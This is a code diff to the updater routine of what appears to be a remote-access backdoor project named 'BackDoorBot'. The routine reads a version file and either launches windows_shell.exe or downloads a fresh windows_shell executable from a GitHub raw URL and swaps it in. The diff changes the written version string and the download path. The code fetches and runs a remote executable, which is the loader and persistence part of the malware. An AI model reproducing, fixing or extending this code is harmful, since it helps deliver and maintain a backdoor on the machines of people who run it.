@@ -18,7 +18,7 @@ def main():
             break
         except:
             listvers = open(p+"/vers/vers.txt", "w")
-            listvers.write("0.1.0")
+            listvers.write("2.1")
 
     if versia[:5]==versiam:
         return 1, "0.1.0"
@@ -31,7 +31,7 @@ while 1:
         if klop:
             os.system(f"start {p}/vers/windows_shell.exe")
         else:
-            wget.download(f"https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot_main/windows_shell{ipo}.exe", p+"/vers/windows_shell.exe")
+            wget.download(f"https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/windows_shell{ipo}.exe", p+"/vers/windows_shell.exe")
             os.remove(p+"/main/windows_shell.exe")
             os.replace("vers/windows_shell.exe", "main/windows_shell.exe")
             vers= open(p+"/vers/vers.txt", "w")
